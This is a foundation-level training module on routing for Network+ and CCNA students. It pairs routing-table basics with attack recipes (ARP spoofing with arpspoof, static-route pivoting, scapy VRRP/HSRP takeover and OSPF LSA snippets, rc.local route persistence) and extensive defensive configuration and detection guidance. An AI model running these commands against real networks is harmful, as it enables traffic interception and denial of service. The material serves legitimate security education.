# Routing Fundamentals

> Track: Offensive / Defensive | Level: Foundation | Certs: Network+, CCNA

## 1. Overview

Routing is how a packet gets from a source network to a destination
network across multiple hops. A host only knows its default
gateway; the routers between source and destination make the
per-hop decisions that move the packet forward. Understanding
those decisions is the foundation for everything else in this
subcategory: dynamic protocols, switching, attacks, defenses.

Three things make routing fundamentals worth studying in depth:

- The routing table is the map. Every forwarding decision is a
  lookup in the table, and understanding the lookup (longest
  prefix match, administrative distance, metric) explains every
  routing behavior.
- Static vs dynamic is a design choice. A small network is easier
  with static routes; a large network is impossible without a
  dynamic protocol. The trade-off is operational, not technical.
- Routing is the attack surface for everything above it. If you
  can change a route, you can redirect traffic, blackhole a
  service, or become a man-in-the-middle without touching the
  hosts.

The vocabulary: routing table, next hop, static route, default
route, longest prefix match (LPM), administrative distance (AD),
metric, routing protocol, autonomous system (AS), forwarding vs
control plane.

## 2. Reconnaissance / Enumeration

Routing reconnaissance is about reading the routing table and
understanding where traffic will go.

**Local routing table:**

```bash
# IPv4 routing table (Linux)
ip route show

# IPv6 routing table
ip -6 route show

# Which route will be used for a given destination?
ip route get 8.8.8.8
ip route get 10.20.30.40

```

**Routing table on a managed switch/router (Cisco):**

```text
show ip route
show ip route 10.20.30.0
show ip route summary
show ip protocols

```

**What the output tells you:**

- A route with `via 10.10.10.1` is a static or dynamic route with
  a next hop.
- A route with `dev eth0` is directly connected (no next hop).
- A route with `proto kernel` is installed by the kernel when an
  interface gets an IP.
- A route with `metric 100` is a dynamic route with a metric.
- The default route is `0.0.0.0/0` (IPv4) or `::/0` (IPv6).

**Longest prefix match demonstration:**

```bash
# Two routes to the same range, different prefix lengths
ip route show | grep -E "10\\.10\\.|10\\.0\\.0\\.0"

# A packet to 10.10.10.5 matches the /24 more specific than the /8
ip route get 10.10.10.5

```

Expected: the more specific route wins, regardless of metric or AD.
Longest prefix match is checked FIRST, before any tiebreaker.

**Administrative distance (what wins when two routes have the same
prefix):**

```text
Connected      0
Static         1
EIGRP summary  5
eBGP          20
OSPF          110
IS-IS         115
RIP           120
EIGRP internal 90
iBGP          200
Unknown      255

```

The lower number wins. A static route (AD 1) beats an OSPF route
(AD 110) to the same prefix, regardless of metric.

**From a foothold: what does this host know about the network?**

```bash
# Routing table reveals the internal topology
ip route show

# What is the default gateway?
ip route show default

# What networks does this host route to directly?
ip route show | grep -v via

```

The routes on a compromised host are a map of the internal
network from that host perspective. That map is the input to the
lateral movement plan.


## 3. Common Attack Vectors

Routing itself is a control-plane function, and the attacks target
the control plane to change what the forwarding plane does.

**Static route injection (local):**
- A compromised host with route privileges can add a route that
  redirects its own traffic. This is a pivot technique, not a
  network-wide attack.
- On a compromised router, a static route can blackhole a service
  or redirect it to the attacker.

**Default gateway manipulation (layer 2):**
- ARP spoofing the gateway (see 01/02) makes the attacker the
  default gateway for the victim. This is the most common routing
  attack in practice.
- DHCP spoofing hands out the attacker as the gateway.

**Dynamic routing protocol injection (network-wide):**
- OSPF: a rogue OSPF speaker injects LSAs to advertise a network
  it does not own, or to become the designated router.
- BGP: a rogue BGP speaker advertises prefixes it does not own,
  causing traffic to flow through it (BGP hijacking).
- EIGRP: a rogue EIGRP speaker with a lower metric or a higher
  autonomous system number.

**First-hop redundancy takeover:**
- HSRP/VRRP: a rogue speaker with a higher priority becomes the
  active gateway, and every host on the segment sends traffic
  through it.
- GLBP: a rogue speaker becomes the active virtual gateway.

**Route table exhaustion:**
- A compromised router with route redistribution can install a
  large number of routes, exhausting the FIB/TCAM. This is a DoS,
  not a MITM.

The common thread: the routing protocol is unauthenticated by
default. A rogue speaker that speaks the protocol correctly is
trusted, and the network routes to it.

## 4. Exploitation Recipes

All commands are run only against systems you own or have written
authorization to test.

### Recipe 1 - Read the routing table as an attacker

Before doing anything, understand what the routing table tells you.

```bash
# Routes with next hops (dynamic or static)
ip route show | grep via

# Directly connected networks (the attacker is on these)
ip route show | grep -v via

# Which hosts are in the default gateway network?
ip route get 8.8.8.8

```

Expected: the gateway network is the one you can pivot from. The
directly connected networks are the ones you already have access
to.

### Recipe 2 - Add a static route (local pivot)

Once you have a foothold, a static route tells the host to send
specific traffic through a second compromised host, bypassing the
default gateway.

```bash
# Route 10.20.0.0/16 through a second compromised host
sudo ip route add 10.20.0.0/16 via 10.10.10.20

# Verify
ip route get 10.20.0.1

# Remove when done
sudo ip route del 10.20.0.0/16

```

Expected: `ip route get 10.20.0.1` now shows 10.10.10.20 as the
next hop, not the default gateway.

### Recipe 3 - Default gateway manipulation via ARP

The simplest routing attack: make yourself the default gateway for
the victim. This is layer 2, but the effect is layer 3 routing.

```bash
# Enable IP forwarding (otherwise it is a DoS)
sudo sysctl -w net.ipv4.ip_forward=1

# Poison the victim (tell it we are the gateway)
sudo arpspoof -i eth0 -t 10.10.10.10 10.10.10.1

# In another terminal, poison the gateway (tell it we are the victim)
sudo arpspoof -i eth0 -t 10.10.10.1 10.10.10.10

```

Expected state on the victim: `ip route get 8.8.8.8` still shows
10.10.10.1 as the gateway, but the ARP table for 10.10.10.1 shows
the attacker MAC. Traffic flows through the attacker.

### Recipe 4 - OSPF LSA injection (lab only)

A rogue OSPF speaker injects a network it does not own. The other
OSPF routers install the route and forward traffic to the rogue
speaker.

```bash
# Example with scapy (requires a full OSPF implementation; this is
# a minimal LSA shape, not a working injection)
sudo python3 -c "
from scapy.all import *
lsa = IP(dst='224.0.0.5')/OSPF_Hdr()/OSPF_LSA(type=1, link_state_id='10.20.30.0')
send(lsa, iface='eth0')
"

```

Real OSPF injection requires a tool like FRRouting configured as
an OSPF neighbor. The attack is not the packet shape; it is the
fact that the protocol trusts any speaker that completes the
handshake. Section 6 covers OSPF authentication.

### Recipe 5 - HSRP takeover (lab only)

A rogue HSRP speaker with a higher priority becomes the active
gateway. Every host on the segment sends traffic through it.

```bash
# HSRP is Cisco-proprietary; the open equivalent is VRRP
# A VRRP speaker with a higher priority becomes the master
sudo python3 -c "
from scapy.all import *
vrrp = IP(dst='224.0.0.18')/VRRP(priority=255, addr='10.10.10.1')
send(vrrp, iface='eth0')
"

```

Expected effect: the real gateway loses the master role, and the
attacker receives all traffic destined for the virtual IP.

All five recipes are detectable by routing protocol authentication
(section 6) and by first-hop security (DHCP snooping, DAI, RA
guard). The point is that the protocol trusts by default.

## 5. Post-Exploitation

Once you control a route, the post-exploitation options are about
what the route gives you.

**Interception:** a route through the attacker means every packet
on that path is visible. Combined with TLS interception (a rogue
CA) or with plaintext protocols, this is a full MITM.

**Blackhole:** a route to `null0` drops traffic. A blackhole of
the backup server is a denial of service that is hard to notice
because the primary still works.

**Redirection to a different service:** a route that sends
traffic for `10.20.30.0/24` to an attacker-controlled host lets
the attacker impersonate every service in that range.

**Persistence:** a static route on a compromised router survives
reboots (if the config is saved) and is invisible to the routing
protocol. It is the cleanest persistence mechanism at layer 3.

```bash
# Persist a static route on a Linux pivot (not recommended: this
# survives reboot only if the config is written)
echo "ip route add 10.20.0.0/16 via 10.10.10.20" | sudo tee -a /etc/rc.local

```

**Reporting:** the finding is not "we changed a route". The finding
is "the routing protocol accepted an unauthenticated speaker, and
the route it advertised was installed by every router in the area".
That is a control-plane trust failure, and it is a critical finding.


## 6. Preventive Controls

Routing defense is about making the control plane trust only
authenticated speakers, and making the forwarding plane validate
what it forwards.

**Route authentication (per protocol):**

```text
! OSPF: enable MD5 or SHA authentication on every interface in the area
interface GigabitEthernet0/1
 ip ospf authentication message-digest
 ip ospf message-digest-key 1 md5 <KEY>

! BGP: enable TCP MD5 (RFC 2385) or TCP-AO (RFC 5925)
neighbor 203.0.113.1 password <KEY>

! EIGRP: enable MD5 authentication
key chain EIGRP-KEYS
 key 1
  key-string <KEY>
interface GigabitEthernet0/1
 ip authentication mode eigrp 100 md5
 ip authentication key-chain eigrp 100 EIGRP-KEYS

```

Authentication does not stop a compromised router (it has the
key), but it stops a rogue speaker that does not.

**First-hop security (see 01/02 for details):**

- DHCP snooping: only trusted ports can offer DHCP.
- Dynamic ARP Inspection: only valid IP/MAC pairs can ARP.
- IP Source Guard: only valid source IPs can send.
- RA guard: only trusted ports can send IPv6 router advertisements.
- BPDU guard: only trusted ports can send STP BPDUs.

**uRPF (anti-spoofing):** a router checks that the return path to
the source goes out the same interface. Spoofed sources fail.

```text
interface GigabitEthernet0/0
 ip verify unicast source reachable-via rx

```

**Prefix filtering (BGP):** only accept prefixes the peer is
supposed to announce. A BGP hijack from a peer that should not
announce 10.0.0.0/8 fails at the filter.

```text
ip prefix-list FROM-PEER permit 203.0.113.0/24
ip prefix-list FROM-PEER deny 0.0.0.0/0 le 32
neighbor 203.0.113.1 prefix-list FROM-PEER in

```

**RPKI (Resource Public Key Infrastructure):** a cryptographic
attestation that an AS is authorized to announce a prefix. A BGP
router can drop RPKI-invalid announcements.

```text
router bgp 65000
 bgp rpki server tcp 203.0.113.10 port 3323 refresh 600
 neighbor 203.0.113.1 route-map RPKI-FILTER in
route-map RPKI-FILTER permit 10
 match rpki valid
route-map RPKI-FILTER deny 20
 match rpki invalid

```

**Max-prefix limit:** a BGP neighbor that sends more prefixes than
expected is shut down. This stops route-table exhaustion.

```text
neighbor 203.0.113.1 maximum-prefix 1000 90 restart 30

```

**TTL security for BGP:** eBGP peers are directly connected, so a
TTL of 1 (GTSM, RFC 5082) prevents off-path injection.

```text
neighbor 203.0.113.1 ttl-security hops 1

```

**Static route hygiene:** a static route should have an explicit
next hop or interface. A static route to a broadcast address is
a mistake, and a static route to a peer that no longer exists is
a blackhole waiting to happen.

## 7. Detection Controls

Each attack in section 3 has a matching detection.

**Routing protocol anomaly detection:**
- New OSPF neighbor that was not in the baseline.
- OSPF LSA with an unexpected link-state ID.
- BGP peer that was not in the baseline.
- BGP announcement of a prefix the peer should not announce.
- BGP AS path anomaly (unexpected prepend, unexpected origin).

**First-hop detection:**
- Gratuitous ARP rate anomaly.
- ARP reply with a different MAC than the DHCP binding.
- DHCP OFFER from a non-trusted port.
- New HSRP/VRRP master.

**Forwarding plane detection:**
- Traceroute path change for a stable destination.
- Asymmetric routing (reply path differs from request path).
- Blackhole detected by a sudden drop in traffic to a destination
  with no corresponding link failure.

**Control-plane logging:**

```text
! OSPF neighbor change
router ospf 1
 log-adjacency-changes detail

! BGP neighbor change
router bgp 65000
 bgp log-neighbor-changes

! Syslog to a central collector
logging host 10.10.10.50
logging trap informational

```

**SIEM correlation:** the high-value alert is "new routing peer +
new route in the table + traffic to that route". Each event alone
is noise; together they are a control-plane compromise.

## 8. Verification

How to verify that the routing defenses are working.

**Verify OSPF authentication:**

```text
show ip ospf interface GigabitEthernet0/1
! Expect: "Message digest authentication enabled"

```

**Verify BGP prefix filter:**

```text
show ip bgp neighbors 203.0.113.1
! Expect: "Prefix-list FROM-PEER" in the inbound policy
show ip bgp | include 10.0.0.0
! Expect: no route for 10.0.0.0/8 unless the peer should announce it

```

**Verify uRPF:**

```text
show ip interface GigabitEthernet0/0 | include verify
! Expect: "verify unicast source reachable-via rx"

```

**Verify first-hop security:**

```bash
# From a test host, try to become the HSRP master
sudo python3 -c "from scapy.all import *; send(IP(dst='224.0.0.2')/HSRP(priority=255, virtualIP='10.10.10.1'), iface='eth0')"
# Expect: no effect. If the test host becomes master, HSRP auth is off.

```

**Verify max-prefix:**

```text
show ip bgp summary
! Expect: "State/PfxRcd" for the peer is a number below the limit
! If it shows "PfxRcd" in parentheses or "Idle", the limit was hit

```

**The verification habit:** after every routing change, re-check
the three things that matter - who is a routing peer, what
prefixes are accepted, and whether the forwarding plane matches
the control plane. A silent routing change is the most common
control-plane failure.

## 9. Certification Alignment

**CompTIA Network+ (N10-009):**
- Domain 2: Network Implementation - routing table, static
  routes, dynamic routing concepts.
- Domain 4: Network Security - routing protocol authentication,
  first-hop security.

**Cisco CCNA (200-301):**
- Domain 3: IP Connectivity - routing table, static routes, OSPF
  (single area).
- Domain 4: IP Services - first-hop redundancy (HSRP, VRRP).
- Domain 5: Security Fundamentals - routing protocol
  authentication.

**Cisco CCNP Enterprise (350-401 ENCOR):**
- OSPF multi-area, BGP, route filtering, RPKI.

**Cross-references:**
- 01 Network Fundamentals covers the OSI/TCP-IP, Ethernet, IP
  addressing and topology basics this subcategory builds on.
- 02 Dynamic Routing Protocols covers OSPF, EIGRP, BGP, RIP in
  detail.
- 03 Switching Advanced covers the switching fabric these routes
  traverse.
- 04 Routing Attacks and 05 Routing Defense cover the attacks and
  defenses in depth.

## 10. Production Notes

**Static routes are not "simple" - they are invisible.** A static
route that was added for a temporary workaround stays in the
config forever, and nobody remembers why. The same route can be
a blackhole after the next topology change. Every static route
needs a comment and an owner.

**Longest prefix match is the first rule.** Every routing
troubleshooting session should start with "which prefix matches,
and what is the longest one". Administrative distance and metric
are tiebreakers, not the first question. This is the single most
common misunderstanding in routing interviews.

**Control plane and forwarding plane are different.** A route can
be in the routing table and not in the forwarding table (FIB).
When "the route is there but traffic does not flow", check the
FIB, not the RIB.

**Routing protocol authentication is not optional.** Every major
routing protocol supports authentication, and none of them enable
it by default. This is the single highest-value routing control,
and it is a one-line change per protocol.

**Cloud routing changes the diagram, not the model.** In a VPC,
route tables and security groups are the routing and ACL layers.
The same questions apply: what is the longest match, what is the
trust boundary, and is the control plane authenticated (IAM in
the cloud, MD5/TCP-AO on-prem).

## 11. References

- RFC 2328 - OSPF Version 2 - https://www.rfc-editor.org/rfc/rfc2328
- RFC 4271 - A Border Gateway Protocol 4 (BGP-4) - https://www.rfc-editor.org/rfc/rfc4271
- RFC 2385 - Protection of BGP Sessions via the TCP MD5 Signature Option - https://www.rfc-editor.org/rfc/rfc2385
- RFC 5082 - The Generalized TTL Security Mechanism (GTSM) - https://www.rfc-editor.org/rfc/rfc5082
- RFC 5925 - The TCP Authentication Option - https://www.rfc-editor.org/rfc/rfc5925
- RFC 6480 - An Infrastructure to Support Secure Internet Routing (RPKI) - https://www.rfc-editor.org/rfc/rfc6480
- NIST SP 800-41 Rev. 1 - Guidelines on Firewalls and Firewall Policy - https://csrc.nist.gov/pubs/sp/800/41/r1/final
- Cisco - IP Routing Configuration Guide - https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/iproute/configuration/15-mt/iproute-15-mt-book.html
- CompTIA Network+ exam objectives - https://www.comptia.org/certifications/network
- Cisco CCNA exam topics - https://learningnetwork.cisco.com/s/ccna-exam-topics

